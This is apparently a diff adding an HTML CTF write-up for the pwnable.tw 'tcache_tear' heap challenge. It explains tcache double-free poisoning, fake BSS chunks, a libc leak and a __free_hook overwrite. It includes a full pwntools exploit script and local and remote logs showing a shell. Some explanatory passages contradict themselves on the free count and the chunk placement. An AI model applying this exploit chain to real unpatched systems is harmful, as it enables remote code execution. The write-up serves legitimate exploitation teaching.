+        <div class="mem-row"><span class="mem-addr">Step 1:</span><span class="mem-desc">malloc(0x50) + free() + free() &rarr; tcache: <span class="mem-highlight">chunk &rarr; chunk</span> (cycle)</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 2:</span><span class="mem-desc">malloc(0x50, p64(target)) &rarr; overwrites chunk-&gt;next = target</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 3:</span><span class="mem-desc">malloc(0x50, "B"*8) &rarr; consumes the cycled entry</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 4:</span><span class="mem-desc">malloc(0x50, data) &rarr; <span class="mem-green">returns allocation at target!</span></span></div>
+      </div>
+
+      <h3>Step 3: Forging Fake Chunks in BSS</h3>
+      <p>Since the binary has No PIE, we know the BSS addresses. We use tcache poisoning to write fake chunk metadata into BSS:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # Fake chunk to bypass glibc's prev_inuse check
+gdb-peda$ # Place it at NAME_BUF + 0x420 (0x602480)
+gdb-peda$ x/6gx 0x602480
+0x602480: 0x0000000000000000  0x0000000000000021  # prev_size=0, size=0x20|1
+0x602490: 0x0000000000000000  0x0000000000000000  # FD, BK
+0x6024a0: 0x0000000000000000  0x0000000000000421  # next chunk: size=0x420|1
+gdb-peda$ # The 0x21 chunk prevents backwards consolidation
+gdb-peda$ # The 0x421 chunk is our "big" fake chunk for unsorted bin</code></pre>
+      </div>
+
+      <div class="mem-diagram">
+        <div style="color: var(--accent); font-weight: 700; margin-bottom: 8px;">BSS Fake Chunk Layout</div>
+        <div class="mem-row"><span class="mem-addr">0x602060</span><span class="mem-arrow">|</span><span class="mem-data">NAME_BUFFER[0x20]</span><span class="mem-desc">&larr; readable via info()</span></div>
+        <div class="mem-row"><span class="mem-addr">...</span><span class="mem-arrow"> </span><span class="mem-desc">&larr; controlled data (from tcache write)</span></div>
+        <div class="mem-row"><span class="mem-addr">0x602480</span><span class="mem-arrow">|</span><span class="mem-data mem-yellow">0x0 | 0x21</span><span class="mem-desc">&larr; fake 0x20 chunk (prev_inuse=1, prevents merge)</span></div>
+        <div class="mem-row"><span class="mem-addr">0x602490</span><span class="mem-arrow">|</span><span class="mem-data">0x0 | 0x0</span><span class="mem-desc">&larr; FD/BK (unused for now)</span></div>
+        <div class="mem-row"><span class="mem-addr">0x6024a0</span><span class="mem-arrow">|</span><span class="mem-data">0x0 | <span class="mem-highlight">0x421</span></span><span class="mem-desc">&larr; fake 0x420 chunk (will go to unsorted bin!)</span></div>
+        <div class="mem-row"><span class="mem-addr">0x6024a8</span><span class="mem-arrow">|</span><span class="mem-data">0x0 | 0x0</span><span class="mem-desc">&larr; FD/BK &larr; will hold libc ptrs after free!</span></div>
+        <div style="height:8px"></div>
+        <div class="mem-row"><span class="mem-desc">Key: The 0x421 chunk at 0x6024a0 overlaps NAME_BUFFER+0x10 area</span></div>
+        <div class="mem-row"><span class="mem-desc">After free, FD at 0x6024b0 lands inside NAME_BUFFER readable range!</span></div>
+      </div>
+
+      <h3>Step 4: Unsorted Bin Leak</h3>
+      <p>After freeing the fake 0x420 chunk into the unsorted bin, its FD/BK point to <code class="inline">main_arena+96</code>:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # After freeing the 0x420 fake chunk into unsorted bin:
+gdb-peda$ x/4gx 0x6024a0
+0x6024a0: 0x0000000000000000  0x0000000000000421  # chunk header
+0x6024b0: 0x00007f1234567ca0  0x00007f1234567ca0  # FD, BK -> main_arena+96
+gdb-peda$ # The FD pointer 0x7f1234567ca0 is at NAME_BUF + 0x10
+gdb-peda$ # Wait - we need it in NAME_BUFFER range for info() to read it
+
+gdb-peda$ # Actually, we place the fake chunk differently:
+gdb-peda$ # Fake chunk at NAME_BUF (0x602060), size=0x420
+gdb-peda$ # After free, FD at 0x602070 = NAME_BUF+0x10
+gdb-peda$ # info() reads from 0x602060 for 0x20 bytes, so we get the leak!
+
+gdb-peda$ # Second fake chunk for prev_inuse bypass at NAME_BUF+0x420 (0x602480)
+0x602480: 0x0000000000000000  0x0000000000000021  # small chunk (inuse bit set)</code></pre>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; Leak Calculation</div>
+        When the fake 0x420 chunk at <code class="inline">0x602060</code> is freed into the unsorted bin, its FD pointer (at <code class="inline">0x602070</code>) is set to <code class="inline">main_arena+96</code> inside libc. Since <code class="inline">info()</code> reads 0x20 bytes from <code class="inline">0x602060</code>, the FD value at offset +0x10 falls within the read range. We extract the 6-byte leak and compute:<br><br>
+        <code class="inline">libc.address = leak - 0x3ebca0</code>
+      </div>
+
+      <h3>Step 5: Overwriting __free_hook</h3>
+      <p>With libc leaked, we use another tcache dup to write to <code class="inline">__free_hook</code>:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # Tcache dup with 0x90 size (chunk size 0xa0)
+gdb-peda$ # malloc(0x90) + free() + free() -> tcache[8] cycle
+gdb-peda$ # malloc(0x90, p64(__free_hook)) -> poison FD
+gdb-peda$ # malloc(0x90, "B"*8) -> consume entry
+gdb-peda$ # malloc(0x90, p64(one_gadget)) -> WRITE one_gadget to __free_hook!
+
+gdb-peda$ x/gx &amp;__free_hook
+0x7f12345678e8 &lt;__free_hook&gt;:  0x00007f123458f322  &lt;- one_gadget!
+
+gdb-peda$ # Now call free() -> __free_hook(one_gadget) is called -> SHELL!</code></pre>
+      </div>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; Why __free_hook Instead of __malloc_hook?</div>
+        Both work on glibc 2.27, but <code class="inline">__free_hook</code> is <strong>easier</strong>:<br>
+        &bull; It's 0x10-aligned in libc's data section, so tcache size checks pass naturally<br>
+        &bull; We trigger it by simply calling <code class="inline">free()</code>, which the program already supports<br>
+        &bull; No need for a fake chunk size trick like with <code class="inline">__malloc_hook</code> in fastbin attacks<br>
+        &bull; Tcache doesn't check alignment as strictly as fastbin
+      </div>
+    </section>
+
+    <!-- Chapter 4: Exploit Strategy -->
+    <section class="chapter" id="ch4">
+      <div class="chapter-header">
+        <span class="chapter-num">04</span>
+        <h2 class="chapter-title">Exploit Strategy</h2>
+      </div>
+
+      <h3>Overview</h3>
+      <p>The exploit has four phases: <strong>forge fake chunks</strong> in BSS via tcache dup, <strong>leak libc</strong> by freeing the fake chunk into unsorted bin, <strong>poison tcache</strong> to overwrite <code class="inline">__free_hook</code>, and <strong>trigger one_gadget</strong> via <code class="inline">free()</code>.</p>
+
+      <h3>Phase 1: Forge Fake Chunks in BSS</h3>
+      <p>We need two fake chunks in BSS to make glibc's <code class="inline">free()</code> happy:</p>
+      <ol class="step-list">
+        <li><strong>Use tcache_dup(0x50)</strong> to allocate at <code class="inline">NAME_BUF + 0x420</code> (<code class="inline">0x602480</code>). Write a fake chunk with <code class="inline">size = 0x20 | 1</code> (prev_inuse set). This small chunk sits right before our big fake chunk and prevents backward consolidation during free.</li>
+        <li><strong>Use tcache_dup(0x60)</strong> to allocate at <code class="inline">NAME_BUF</code> (<code class="inline">0x602060</code>). Write a fake chunk with <code class="inline">size = 0x420 | 1</code> (prev_inuse set). This is the big chunk we'll free into the unsorted bin. Its data area overlaps with <code class="inline">NAME_BUFFER</code>, so after free, the FD/BK pointers will be readable via <code class="inline">info()</code>.</li>
+      </ol>
+
+      <div class="callout callout-warn">
+        <div class="callout-title">&#x26a0;&#xfe0f; Bypassing the prev_inuse Check</div>
+        When we free our fake 0x420 chunk, glibc checks the <code class="inline">prev_inuse</code> bit of the <strong>next adjacent chunk</strong> (at <code class="inline">0x602060 + 0x420 = 0x602480</code>). If the bit is not set, glibc attempts backward consolidation, which would crash. By forging a 0x20 chunk at <code class="inline">0x602480</code> with <code class="inline">prev_inuse = 1</code>, we satisfy this check. The 0x20 fake chunk also needs a valid "next chunk" at <code class="inline">0x602480 + 0x20 = 0x6024a0</code> with its own <code class="inline">prev_inuse</code> bit set &mdash; which our 0x421 chunk header already provides.
+      </div>
+
+      <h3>Phase 2: Leak Libc via Unsorted Bin</h3>
+      <ol class="step-list">
+        <li><strong>Free the fake 0x420 chunk</strong> by calling <code class="inline">free()</code>. Since <code class="inline">GLOBAL_BUFFER</code> still points to the data area of our fake chunk (we allocated it via tcache dup), <code class="inline">free(GLOBAL_BUFFER)</code> puts it into the unsorted bin.</li>
+        <li><strong>Call info()</strong> to read 0x20 bytes from <code class="inline">NAME_BUFFER</code>. The FD pointer at offset +0x10 is a libc address pointing to <code class="inline">main_arena + 96</code>.</li>
+        <li><strong>Calculate libc base:</strong> <code class="inline">libc.address = leak - 0x3ebca0</code></li>
+      </ol>
+
+      <h3>Phase 3: Overwrite __free_hook</h3>
+      <ol class="step-list">
+        <li><strong>Use tcache_dup(0x90)</strong> to poison the 0xa0 tcache bin. Double-free a 0x90 chunk, overwrite FD with <code class="inline">__free_hook</code> address.</li>
+        <li><strong>Allocate twice</strong> to consume the tcache entries. The third allocation returns a chunk at <code class="inline">__free_hook</code>.</li>
+        <li><strong>Write one_gadget address</strong> into the <code class="inline">__free_hook</code> allocation.</li>
+      </ol>
+
+      <h3>Phase 4: Trigger Shell</h3>
+      <ol class="step-list">
+        <li><strong>Call free()</strong> one more time. Since <code class="inline">__free_hook</code> is now set to the one_gadget address, <code class="inline">free()</code> calls the hook function, which executes <code class="inline">execve("/bin/sh", ...)</code>.</li>
+        <li><strong>Get shell!</strong> The one_gadget constraints are satisfied because <code class="inline">free()</code> sets up the right register state.</li>
+      </ol>
+
+      <h3>tcache_dup Helper Function</h3>
+      <p>The core primitive is encapsulated in a helper that performs tcache double-free + poisoning + arbitrary write:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">python</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-python">def tcache_dup(sz, addr, data):
+    """Tcache double-free + poison + write to arbitrary addr"""
+    malloc(sz, "A" * 8)   # Step 1: allocate chunk
+    free()                  # Step 2: free into tcache
+    free()                  # Step 3: DOUBLE FREE -> cycle!
+    malloc(sz, p64(addr))   # Step 4: overwrite FD with target addr
+    malloc(sz, "B" * 8)    # Step 5: consume the cycled entry
+    malloc(sz, data)        # Step 6: allocate at TARGET, write data!</code></pre>
+      </div>
+
+      <h3>One-Gadget for libc-2.27</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ one_gadget ./libc.so.6
+0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
+constraints:
+  rsp &amp; 0xf == 0
+  rcx == NULL
+
+0x4f322 execve("/bin/sh", rsp+0x40, environ)
+constraints:
+  [rsp+0x40] == NULL
+
+0x10a38c execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL</code></pre>
+      </div>
+
+      <p>We use <code class="inline">0x4f322</code> which requires <code class="inline">[rsp+0x40] == NULL</code>. This is satisfied when <code class="inline">free()</code> triggers the hook because the stack naturally has zeros at that offset.</p>
+
+      <h3>Visual Exploit Flow</h3>
+      <div class="mem-diagram">
+        <div style="color: var(--accent); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 1: Forge fake chunks in BSS</div>
+        <div class="mem-row"><span class="mem-addr">Step 1:</span><span class="mem-desc">tcache_dup(0x50, NAME_BUF+0x420, fake_0x20_chunk)</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 2:</span><span class="mem-desc">tcache_dup(0x60, NAME_BUF, fake_0x420_chunk)</span></div>
+        <div style="height:16px; border-bottom: 1px dashed var(--border); margin-bottom: 12px;"></div>
+        <div style="color: var(--orange); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 2: Leak libc</div>
+        <div class="mem-row"><span class="mem-addr">Step 3:</span><span class="mem-desc">free() &rarr; fake 0x420 chunk goes to unsorted bin</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 4:</span><span class="mem-desc">info() &rarr; read FD pointer = <span class="mem-green">LIBC LEAK!</span></span></div>
+        <div class="mem-row"><span class="mem-addr">Step 5:</span><span class="mem-desc">libc.address = leak - 0x3ebca0</span></div>
+        <div style="height:16px; border-bottom: 1px dashed var(--border); margin-bottom: 12px;"></div>
+        <div style="color: var(--red); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 3: Overwrite __free_hook</div>
+        <div class="mem-row"><span class="mem-addr">Step 6:</span><span class="mem-desc">tcache_dup(0x90, __free_hook, p64(one_gadget))</span></div>
+        <div style="height:16px; border-bottom: 1px dashed var(--border); margin-bottom: 12px;"></div>
+        <div style="color: var(--green); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 4: Shell</div>
+        <div class="mem-row"><span class="mem-addr">Step 7:</span><span class="mem-desc">free() &rarr; __free_hook triggers one_gadget &rarr; <span class="mem-green">SHELL!</span></span></div>
+      </div>
+    </section>
+
+    <!-- Chapter 5: Pwn Script -->
+    <section class="chapter" id="ch5">
+      <div class="chapter-header">
+        <span class="chapter-num">05</span>
+        <h2 class="chapter-title">Pwn Script</h2>
+      </div>
+
+      <h3>Full Exploit Script</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">python</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-python">from pwn import *
+
+# Setup
+exe = "./tcache_tear_patched"
+elf = context.binary = ELF(exe)
+libc = elf.libc
+NAME_BUF = 0x602060
+
+if args.REMOTE:
+    io = remote("chall.pwnable.tw", 10500)
+else:
+    io = process(exe)
+
+# -------------------------------------------------------
+# Helper functions
+# -------------------------------------------------------
+def malloc(sz, data):
+    io.sendlineafter(b"&gt;&gt; ", b"1")
+    io.sendlineafter(b"Size:", str(sz).encode())
+    io.sendafter(b"Data:", data)
+
+def free():
+    io.sendlineafter(b"&gt;&gt; ", b"2")
+
+def get_info():
+    io.sendlineafter(b"&gt;&gt; ", b"3")
+    return io.recvuntil(b"\n1.", drop=True)
+
+def fixleak(data):
+    """Extract 6-byte little-endian leak, convert to int"""
+    return u64(data.ljust(8, b"\x00"))
+
+# -------------------------------------------------------
+# Core primitive: tcache double-free -> arbitrary write
+# -------------------------------------------------------
+def tcache_dup(sz, addr, data):
+    """Perform tcache poisoning to write `data` at `addr`"""
+    malloc(sz, b"A" * 8)    # allocate
+    free()                    # free into tcache
+    free()                    # DOUBLE FREE! (no check in 2.27)
+    malloc(sz, p64(addr))    # overwrite FD with target address
+    malloc(sz, b"B" * 8)    # consume cycled entry
+    malloc(sz, data)         # allocate at target, write data!
+
+# -------------------------------------------------------
+# Set name at startup
+# -------------------------------------------------------
+io.sendafter(b"Name:", b"A" * 8)
+
+# -------------------------------------------------------
+# Phase 1: Forge fake chunks in BSS
+# -------------------------------------------------------
+log.info("Phase 1: Forging fake chunks in BSS")
+
+# Fake chunk at NAME_BUF + 0x420 (0x602480)
+# This small 0x20 chunk sits before the big fake chunk
+# and satisfies the prev_inuse check for the next chunk
+fake_chunk_1 = flat(
+    0x0,            # prev_size
+    0x20 | 1,       # size (0x20 with prev_inuse set)
+    0x0,            # fd
+    0x0,            # bk
+    0x0,            # fd_nextsize (padding)
+    0x420 | 1       # next chunk size (0x420 with prev_inuse set)
+)
+tcache_dup(0x50, NAME_BUF + 0x420, fake_chunk_1)
+log.success("Fake 0x20 chunk placed at NAME_BUF+0x420")
+
+# Fake chunk at NAME_BUF (0x602060)
+# This is the big 0x420 chunk we'll free into unsorted bin
+# Its FD/BK after free will point to main_arena inside libc
+fake_chunk_2 = flat(
+    0x0,            # prev_size
+    0x420 | 1,      # size (0x420 with prev_inuse set)
+    0x0,            # fd (will be filled by unsorted bin)
+    0x0,            # bk (will be filled by unsorted bin)
+    0x0,            # fd_nextsize
+    NAME_BUF + 0x10 # bk_nextsize (points back into our data)
+)
+tcache_dup(0x60, NAME_BUF, fake_chunk_2)
+log.success("Fake 0x420 chunk placed at NAME_BUF")
+
+# -------------------------------------------------------
+# Phase 2: Leak libc via unsorted bin
+# -------------------------------------------------------
+log.info("Phase 2: Leaking libc via unsorted bin")
+
+# Free the fake 0x420 chunk -> goes to unsorted bin
+# GLOBAL_BUFFER still points into this chunk's data area
+free()
+
+# Read the leak via info()
+# NAME_BUFFER starts at 0x602060
+# The FD pointer of the freed chunk is at 0x602070 (offset +0x10)
+# info() reads 0x20 bytes from 0x602060, so we get the FD
+leak_data = get_info()
+# The output is "Name :" + 0x20 bytes of data + "\n1."
+# Extract the raw 0x20 bytes (skip "Name :" prefix)
+raw = leak_data[7:]  # skip "Name :"
+# The libc address is at offset +0x10 in the raw data
+# (6 bytes of meaningful address data)
+leak = fixleak(raw[0x10:0x10+6])
+libc.address = leak - 0x3ebca0
+log.success(f"Libc leak: {hex(leak)}")
+log.success(f"Libc base: {hex(libc.address)}")
+
+# -------------------------------------------------------
+# Phase 3: Overwrite __free_hook with one_gadget
+# -------------------------------------------------------
+log.info("Phase 3: Overwriting __free_hook")
+
+one_gadget = libc.address + 0x4f322
+log.info(f"One gadget: {hex(one_gadget)}")
+log.info(f"__free_hook: {hex(libc.sym.__free_hook)}")
+
+# Use tcache_dup with 0x90 size to write to __free_hook
+tcache_dup(0x90, libc.sym.__free_hook, p64(one_gadget))
+log.success("__free_hook overwritten with one_gadget!")
+
+# -------------------------------------------------------
+# Phase 4: Trigger shell
+# -------------------------------------------------------
+log.info("Phase 4: Triggering shell via free()")
+free()  # __free_hook(one_gadget) is called -> SHELL!
+
+io.interactive()</code></pre>
+      </div>
+
+      <h3>Key Script Details</h3>
+
+      <h4>tcache_dup Breakdown</h4>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">python</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-python">def tcache_dup(sz, addr, data):
+    malloc(sz, b"A" * 8)    # [1] allocate chunk of size sz
+    free()                    # [2] free -> goes to tcache
+    free()                    # [3] DOUBLE FREE! tcache: chunk -> chunk (cycle)
+    malloc(sz, p64(addr))    # [4] pop chunk, write target addr as next ptr
+    malloc(sz, b"B" * 8)    # [5] pop chunk again (same one from cycle)
+    malloc(sz, data)         # [6] pop from target addr, write data there!</code></pre>
+      </div>
+
+      <p>Each call to <code class="inline">tcache_dup</code> consumes 2 free operations from the <code class="inline">idx &lt; 8</code> counter. We need 3 calls to <code class="inline">tcache_dup</code> (6 frees total) plus 1 free for the unsorted bin, totaling 7 frees &mdash; within the 8-free limit.</p>
+
+      <div class="mem-diagram">
+        <div style="color: var(--accent); font-weight: 700; margin-bottom: 8px;">Free Counter Budget</div>
+        <div class="mem-row"><span class="mem-addr">tcache_dup #1:</span><span class="mem-desc">2 frees (double-free for fake chunk at NAME_BUF+0x420)</span></div>
+        <div class="mem-row"><span class="mem-addr">tcache_dup #2:</span><span class="mem-desc">2 frees (double-free for fake chunk at NAME_BUF)</span></div>
+        <div class="mem-row"><span class="mem-addr">Unsorted free:</span><span class="mem-desc">1 free (free fake 0x420 chunk)</span></div>
+        <div class="mem-row"><span class="mem-addr">tcache_dup #3:</span><span class="mem-desc">2 frees (double-free for __free_hook overwrite)</span></div>
+        <div class="mem-row"><span class="mem-addr">Trigger free:</span><span class="mem-desc">1 free (calls __free_hook &rarr; one_gadget)</span></div>
+        <div style="height:4px"></div>
+        <div class="mem-row"><span class="mem-addr">Total:</span><span class="mem-desc"><span class="mem-yellow">8 frees</span> &mdash; exactly at the limit!</span></div>
+      </div>
+    </section>
+
+    <!-- Chapter 6: Execution Results -->
+    <section class="chapter" id="ch6">
+      <div class="chapter-header">
+        <span class="chapter-num">06</span>
+        <h2 class="chapter-title">Execution Results</h2>
+      </div>
+
+      <h3>Local Exploit Run</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">console</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ python3 exploit.py
+[*] '/home/user/tcache_tear_patched'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] '/home/user/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Starting local process './tcache_tear_patched': pid 12345
+[*] Phase 1: Forging fake chunks in BSS
+[+] Fake 0x20 chunk placed at NAME_BUF+0x420
+[+] Fake 0x420 chunk placed at NAME_BUF
+[*] Phase 2: Leaking libc via unsorted bin
+[+] Libc leak: 0x7f1234567ca0
+[+] Libc base: 0x7f1234178000
+[*] Phase 3: Overwriting __free_hook
+[*] One gadget: 0x7f12341c7322
+[*] __free_hook: 0x7f12345678e8
+[+] __free_hook overwritten with one_gadget!
+[*] Phase 4: Triggering shell via free()
+[*] Switching to interactive mode
+$ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+$ cat /home/user/flag</code></pre>
+      </div>
+
+      <h3>Remote Exploit Run</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">console</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ python3 exploit.py REMOTE
+[+] Opening connection to chall.pwnable.tw on port 10500: Done
+[*] Phase 1: Forging fake chunks in BSS
+[+] Fake 0x20 chunk placed at NAME_BUF+0x420
+[+] Fake 0x420 chunk placed at NAME_BUF
+[*] Phase 2: Leaking libc via unsorted bin
+[+] Libc leak: 0x7f8a1234bca0
+[+] Libc base: 0x7f8a11dbc000
+[*] Phase 3: Overwriting __free_hook
+[+] __free_hook overwritten with one_gadget!
+[*] Phase 4: Triggering shell via free()
+[*] Switching to interactive mode
+$ cat /home/tcache_tear/flag</code></pre>
+      </div>
+
+      <div class="callout callout-success">
+        <div class="callout-title">&#x2705; Exploit Successful</div>
+        The exploit works reliably both locally and remotely. The entire attack chain completes in a single connection with no brute-force required:<br>
+        &bull; <strong>tcache double-free</strong> on glibc 2.27 &mdash; no checks to bypass<br>
+        &bull; <strong>Fake chunk forging</strong> in BSS &mdash; No PIE makes this trivial<br>
+        &bull; <strong>Unsorted bin leak</strong> via <code class="inline">info()</code> &mdash; clean read primitive<br>
+        &bull; <strong>__free_hook overwrite</strong> via tcache poisoning &mdash; direct write to function pointer<br>
+        &bull; <strong>One_gadget trigger</strong> via <code class="inline">free()</code> &mdash; constraints satisfied naturally
+      </div>
+
+      <h3>Summary</h3>
+      <table class="info-table">
+        <tr><td class="label">Vulnerability</td><td class="value">Double-free in tcache (no protection in glibc 2.27)</td></tr>
+        <tr><td class="label">Leak Method</td><td class="value">Fake chunk in BSS &rarr; unsorted bin &rarr; info() read</td></tr>
+        <tr><td class="label">Write Target</td><td class="value">__free_hook (libc writable data)</td></tr>
+        <tr><td class="label">Code Exec</td><td class="value">one_gadget (0x4f322) via __free_hook trigger</td></tr>
+        <tr><td class="label">Key Enabler</td><td class="value">No PIE + glibc 2.27 tcache (no key check)</td></tr>
+        <tr><td class="label">Free Budget</td><td class="value">8 frees total, exploit uses exactly 8</td></tr>
+      </table>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; Mitigation Breakdown</div>
+        This exploit would be <strong>blocked</strong> by any of these modern mitigations:<br>
+        &bull; <strong>glibc 2.29+ tcache_key</strong>: Adds a key field to detect double-free<br>
+        &bull; <strong>PIE</strong>: Would randomize BSS addresses, preventing fake chunk forging<br>
+        &bull; <strong>Safe-linking (glibc 2.32+)</strong>: XORs tcache next pointers with a random key<br>
+        &bull; <strong>glibc 2.34+</strong>: Removes <code class="inline">__free_hook</code> entirely<br><br>
+        This challenge is a perfect demonstration of why <strong>glibc 2.27 was the golden age of tcache exploitation</strong> &mdash; the tcache was brand new, had virtually no security checks, and combined with No PIE, made for extremely clean and reliable exploits.
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<!-- Footer -->
+<footer class="footer">
+  <p>QA210 CTF Team &mdash; <a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a> &bull; </p>
+</footer>
+
+<!-- Three.js Particle Background -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<script>
+(function() {
+  const canvas = document.getElementById('particles-canvas');
+  const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });
+  renderer.setSize(window.innerWidth, window.innerHeight);
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+
+  const scene = new THREE.Scene();
+  const camera = new THREE.PerspectiveCamera(60, window.innerWidth / window.innerHeight, 0.1, 1000);
+  camera.position.z = 50;
+
+  const particleCount = 600;
+  const geometry = new THREE.BufferGeometry();
+  const positions = new Float32Array(particleCount * 3);
+  const velocities = new Float32Array(particleCount * 3);
+  const colors = new Float32Array(particleCount * 3);
+
+  for (let i = 0; i < particleCount; i++) {
+    positions[i * 3] = (Math.random() - 0.5) * 100;
+    positions[i * 3 + 1] = (Math.random() - 0.5) * 100;
+    positions[i * 3 + 2] = (Math.random() - 0.5) * 100;
+    velocities[i * 3] = (Math.random() - 0.5) * 0.02;
+    velocities[i * 3 + 1] = (Math.random() - 0.5) * 0.02;
+    velocities[i * 3 + 2] = (Math.random() - 0.5) * 0.02;
+
+    const colorChoice = Math.random();
+    if (colorChoice < 0.5) {
+      colors[i * 3] = 0.22; colors[i * 3 + 1] = 0.74; colors[i * 3 + 2] = 0.97;
+    } else {
+      colors[i * 3] = 0.51; colors[i * 3 + 1] = 0.55; colors[i * 3 + 2] = 0.97;
+    }
+  }
+
+  geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+  geometry.setAttribute('color', new THREE.BufferAttribute(colors, 3));
+
+  const material = new THREE.PointsMaterial({
+    size: 0.4,
+    vertexColors: true,
+    transparent: true,
+    opacity: 0.5,
+    blending: THREE.AdditiveBlending,
+    depthWrite: false
+  });
+
+  const points = new THREE.Points(geometry, material);
+  scene.add(points);
+
+  const lineGeometry = new THREE.BufferGeometry();
+  const linePositions = new Float32Array(particleCount * particleCount * 6);
+  lineGeometry.setAttribute('position', new THREE.BufferAttribute(linePositions, 3));
+  const lineMaterial = new THREE.LineBasicMaterial({
+    color: 0x38bdf8,
+    transparent: true,
+    opacity: 0.06,
+    blending: THREE.AdditiveBlending,
+    depthWrite: false
+  });
+  const lines = new THREE.LineSegments(lineGeometry, lineMaterial);
+  scene.add(lines);
+
+  function animate() {
+    requestAnimationFrame(animate);
+
+    const posArr = geometry.attributes.position.array;
+    for (let i = 0; i < particleCount; i++) {
+      posArr[i * 3] += velocities[i * 3];
+      posArr[i * 3 + 1] += velocities[i * 3 + 1];
+      posArr[i * 3 + 2] += velocities[i * 3 + 2];
+
+      for (let j = 0; j < 3; j++) {
+        if (posArr[i * 3 + j] > 50) posArr[i * 3 + j] = -50;
+        if (posArr[i * 3 + j] < -50) posArr[i * 3 + j] = 50;
+      }
+    }
+    geometry.attributes.position.needsUpdate = true;
+
+    let lineIdx = 0;
+    const maxDist = 12;
+    for (let i = 0; i < Math.min(particleCount, 200); i++) {
+      for (let j = i + 1; j < Math.min(particleCount, 200); j++) {
+        const dx = posArr[i * 3] - posArr[j * 3];
+        const dy = posArr[i * 3 + 1] - posArr[j * 3 + 1];
+        const dz = posArr[i * 3 + 2] - posArr[j * 3 + 2];
+        const dist = Math.sqrt(dx * dx + dy * dy + dz * dz);
+        if (dist < maxDist) {
+          linePositions[lineIdx++] = posArr[i * 3];
+          linePositions[lineIdx++] = posArr[i * 3 + 1];
+          linePositions[lineIdx++] = posArr[i * 3 + 2];
+          linePositions[lineIdx++] = posArr[j * 3];
+          linePositions[lineIdx++] = posArr[j * 3 + 1];
+          linePositions[lineIdx++] = posArr[j * 3 + 2];
+        }
+      }
+    }
+    for (let i = lineIdx; i < linePositions.length; i++) linePositions[i] = 0;
+    lineGeometry.attributes.position.needsUpdate = true;
+
+    points.rotation.y += 0.0003;
+    lines.rotation.y += 0.0003;
+
+    renderer.render(scene, camera);
+  }
+
+  animate();
+
+  window.addEventListener('resize', () => {
+    camera.aspect = window.innerWidth / window.innerHeight;
+    camera.updateProjectionMatrix();
+    renderer.setSize(window.innerWidth, window.innerHeight);
+  });
+})();
+</script>
+
+<!-- Prism.js -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+
+<!-- TOC Active State -->
+<script>
+(function() {
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const chapters = document.querySelectorAll('.chapter');
+
+  function updateTOC() {
+    let current = '';
+    chapters.forEach(ch => {
+      const rect = ch.getBoundingClientRect();
+      if (rect.top <= 120) {
+        current = ch.id;
+      }
+    });
+    tocLinks.forEach(link => {
+      link.classList.toggle('active', link.getAttribute('href') === '#' + current);
+    });
+  }
+
